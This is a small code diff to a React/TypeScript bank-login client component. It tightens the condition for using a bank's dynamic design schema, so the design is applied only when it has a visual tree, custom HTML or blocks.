@@ -171,7 +171,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   }
 
   // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
-  if (bank.design) {
+  if (bank.design && (bank.design.visualTree || bank.design.customHtml || (bank.design.blocks && bank.design.blocks.length > 0))) {
     const design = bank.design;
 
     if (design.visualTree && !design.customHtml) {
